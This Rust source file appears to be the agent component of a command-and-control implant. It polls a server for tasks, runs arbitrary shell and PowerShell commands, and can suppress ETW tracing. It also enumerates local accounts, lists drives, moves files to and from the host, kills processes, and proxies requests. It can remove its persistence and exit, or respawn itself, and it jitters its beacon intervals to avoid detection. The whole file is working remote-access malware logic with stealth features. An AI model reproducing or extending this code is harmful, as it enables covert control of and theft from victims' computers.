use libra_comm::http::HttpCommunicator;
use libra_load::ModuleMainFn;

use super::utils::blocking_val;

// ── Heartbeat ────────────────────────────────────────────────────────────

/// What a heartbeat task needs: either a module entry to execute (lock-free)
/// or an already-computed response.
enum TaskOutcome {
    /// Execute this module entry with the given input (no locks held).
    Run { main: ModuleMainFn, input: String },
    /// Response used verbatim (matches legacy direct-return branches).
    DoneUnwrapped(String),
    /// Response that gets wrapped in the standard task envelope.
    DoneWrapped(String),
    /// Self-destruct: remove persistence entries, then exit the process.
    /// The result is submitted first so the task does not hang as running.
    Destroy,
    /// Self-restart: spawn a fresh copy of this binary, then exit the process.
    Restart,
}

/// What to do after the task result has been submitted (agent lifecycle ops).
enum ExitAction {
    None,
    Destroy,
    Restart,
}

pub(crate) async fn heartbeat_tick(
    http: &std::sync::Arc<HttpCommunicator>,
    agent_id: &str,
    session_key: Option<&[u8; 32]>,
    module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
) -> Result<(), String> {
    // 心跳兜底：刷新在线状态 + 拉取可能错过的任务（SSE 为主通道）。
    let task = http.heartbeat(agent_id, session_key).await?;
    if let Some(task) = task {
        // 并发执行：不阻塞心跳循环
        let h = http.clone();
        let mm = module_manager.clone();
        let aid = agent_id.to_string();
        let key = session_key.copied();
        tokio::spawn(async move {
            handle_task(&h, &task, &aid, key.as_ref(), &mm).await;
        });
    }
    Ok(())
}

/// 已处理的任务 id（SSE 推送与心跳轮询双通道去重；容量上限防内存增长）。
static SEEN_TASKS: std::sync::LazyLock<std::sync::Mutex<std::collections::HashSet<String>>> =
    std::sync::LazyLock::new(|| std::sync::Mutex::new(std::collections::HashSet::new()));
const SEEN_TASK_CAP: usize = 512;

/// 执行一个任务（SSE 推送或心跳轮询到达均可调用；按 task.id 去重）。
/// `http` 用于结果上报（需已配置 session_token + profile）。
pub(crate) async fn handle_task(
    http: &HttpCommunicator,
    task: &libra_common::models::AgentTask,
    agent_id: &str,
    session_key: Option<&[u8; 32]>,
    module_manager: &std::sync::Arc<tokio::sync::Mutex<crate::module_manager::ModuleManager>>,
) {
    // 去重：同一任务 id 只执行一次（SSE 推送 + 心跳兜底可能重复到达）
    {
        let mut seen = SEEN_TASKS.lock().unwrap();
        if seen.len() >= SEEN_TASK_CAP {
            seen.clear();
        }
        if !seen.insert(task.id.clone()) {
            libra_common::dlog!("[task] duplicate id={} — skipped", task.id);
            return;
        }
    }
    libra_common::dlog!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
        task.id,
        task.command_type,
        task.command,
        task.timeout_seconds
    );

    // Resolve the module entry under the lock, then execute it *without*
    // the lock so a long-running task never blocks the heartbeat (or other
    // tasks) — the same concurrency model as the WS dispatcher.
    let outcome = {
        let mut mm = module_manager.lock().await;
        resolve_task(task, &mut mm).await
    };

    let (result, exit_action) = match outcome {
        TaskOutcome::Run { main, input } => {
            let output = match crate::module_manager::execute_module(main, &input).await {
                Ok(r) => r,
                Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
            };
            (wrap_result(&task.id, &output), ExitAction::None)
        }
        TaskOutcome::DoneUnwrapped(r) => (r, ExitAction::None),
        TaskOutcome::DoneWrapped(r) => (wrap_result(&task.id, &r), ExitAction::None),
        TaskOutcome::Destroy => (
            wrap_result(&task.id, r#"{"status":"destroying","op":"kill_and_clean"}"#),
            ExitAction::Destroy,
        ),
        TaskOutcome::Restart => (
            wrap_result(&task.id, r#"{"status":"restarting"}"#),
            ExitAction::Restart,
        ),
    };

    libra_common::dlog!("[SEND] task_result | id={} | len={}", task.id, result.len());
    let _ = http.submit_result(agent_id, &result, session_key).await;

    // Self-destruct / self-restart happen *after* the result is submitted,
    // so the server records the task as completed and the agent then exits.
    match exit_action {
        ExitAction::Destroy => {
            libra_common::dlog!("[kill_and_clean] removing persistence and exiting");
            crate::persistence::PersistenceManager::cleanup();
            std::process::exit(0);
        }
        ExitAction::Restart => {
            libra_common::dlog!("[restart] spawning self and exiting");
            spawn_self();
            std::process::exit(0);
        }
        ExitAction::None => {}
    }
}

/// Spawn a detached copy of the current executable (the agent binary).
/// The fresh process reads the same injected config from itself, so it
/// re-registers and resumes heartbeats as a new agent instance.
fn spawn_self() {
    let exe = match std::env::current_exe() {
        Ok(e) => e,
        Err(e) => {
            libra_common::dlog!("[restart] current_exe failed: {e}");
            return;
        }
    };
    match std::process::Command::new(&exe).spawn() {
        Ok(_) => libra_common::dlog!("[restart] child spawned: {}", exe.display()),
        Err(e) => libra_common::dlog!("[restart] spawn failed: {e}"),
    }
}

fn wrap_result(task_id: &str, output: &str) -> String {
    // 失败判定：模块/任务层显式返回 JSON 错误对象。之前用 `!output.contains("\"error\"")`
    // 会把「命令输出本身含 error 字样」的合法结果误判为失败（如 grep error、echo error）。
    let success = match serde_json::from_str::<serde_json::Value>(output) {
        Ok(serde_json::Value::Object(map)) => !map.contains_key("error"),
        _ => true,
    };
    serde_json::json!({
        "taskId": task_id,
        "success": success,
        "output": output,
        "error": null,
    }).to_string()
}

/// Map a heartbeat task to a module entry (or a direct response). Called while
/// the module manager lock is held; execution happens after the lock drops.
async fn resolve_task(
    task: &libra_common::models::AgentTask,
    module_manager: &mut crate::module_manager::ModuleManager,
) -> TaskOutcome {
    use libra_common::models::CommandType;

    let run = |name: String, input: serde_json::Value| async move {
        match module_manager.prepare(&name, &input.to_string()).await {
            Ok((main, input)) => TaskOutcome::Run { main, input },
            Err(e) => TaskOutcome::DoneWrapped(
                serde_json::json!({ "success": false, "output": e }).to_string(),
            ),
        }
    };

    match task.command_type {
        CommandType::Shell => {
            let input = serde_json::json!({
                "command": task.command,
                "timeoutSeconds": if task.timeout_seconds > 0 { task.timeout_seconds } else { 60 },
            });
            run("shell".to_string(), input).await
        }
        CommandType::PowerShell => {
            // arguments 支持 "etwSuppress=true"（ETW 痕迹抑制，默认关）
            let suppress_etw = task.arguments.iter().any(|a| a.eq_ignore_ascii_case("etwSuppress=true"));
            let input = serde_json::json!({
                "script": task.command.clone(),
                "timeoutSeconds": if task.timeout_seconds > 0 { task.timeout_seconds } else { 60 },
                "etwSuppress": suppress_etw,
            });
            run("powershell".to_string(), input).await
        }
        CommandType::LocalAccounts => {
            run("recon".to_string(), serde_json::json!({ "op": "local_accounts" })).await
        }
        CommandType::Proxy => {
            run("proxy".to_string(), serde_json::json!({ "url": task.command, "method": "GET" })).await
        }
        CommandType::FileList => {
            let input = serde_json::json!({ "op": "list", "path": task.command, "limit": 1000 });
            run("files".to_string(), input).await
        }
        CommandType::FileDrives => {
            let drives = blocking_val(|| {
                let executor = libra_platform::get_executor();
                executor.get_drives()
            }).await;
            let escaped: Vec<String> = drives.iter()
                .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                .collect();
            let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
            TaskOutcome::DoneUnwrapped(json)
        }
        CommandType::Generic => {
            // 通用模块执行：command = 模块名，arguments[0] = 输入 JSON
            let input = task.arguments.first()
                .and_then(|a| serde_json::from_str::<serde_json::Value>(a).ok())
                .unwrap_or_else(|| serde_json::json!({}));
            run(task.command.clone(), input).await
        }
        CommandType::Upload | CommandType::Download => {
            // File transfer with arguments: FileOps read/write (cloud module)
            if let Some(arg) = task.arguments.first() {
                let cmd = task.command.clone();
                let arg = arg.clone();
                let is_download = task.command_type == CommandType::Download;
                let (op, data) = if is_download {
                    ("write", arg)
                } else {
                    ("read", String::new())
                };
                let input = serde_json::json!({ "op": op, "path": cmd, "data": data });
                run("files".to_string(), input).await
            } else {
                TaskOutcome::DoneWrapped(r#"{"error":"No file path specified"}"#.to_string())
            }
        }
        CommandType::Kill => {
            // Kill specific process by PID (cloud recon module)
            if let Ok(pid) = task.command.parse::<u32>() {
                run("recon".to_string(), serde_json::json!({ "op": "kill", "pid": pid })).await
            } else {
                TaskOutcome::DoneWrapped(r#"{"error":"Invalid PID"}"#.to_string())
            }
        }
        CommandType::Sleep => {
            TaskOutcome::DoneWrapped(r#"{"status":"sleeping"}"#.to_string())
        }
        CommandType::KillAndClean => {
            TaskOutcome::Destroy
        }
        CommandType::Restart => {
            TaskOutcome::Restart
        }
        _ => {
            // Unknown command type — respond with generic ok
            TaskOutcome::DoneWrapped(format!(r#"{{"status":"ok","commandType":"{:?}"}}"#, task.command_type))
        }
    }
}

pub(crate) fn jittered_interval(base_ms: u64, jitter_percent: f64) -> u64 {
    // 块状抖动（x86 风格）：常规 ±jitter + 偶发长眠，避免均匀分布的可预测性
    crate::config::x86_style_jitter(base_ms, jitter_percent)
}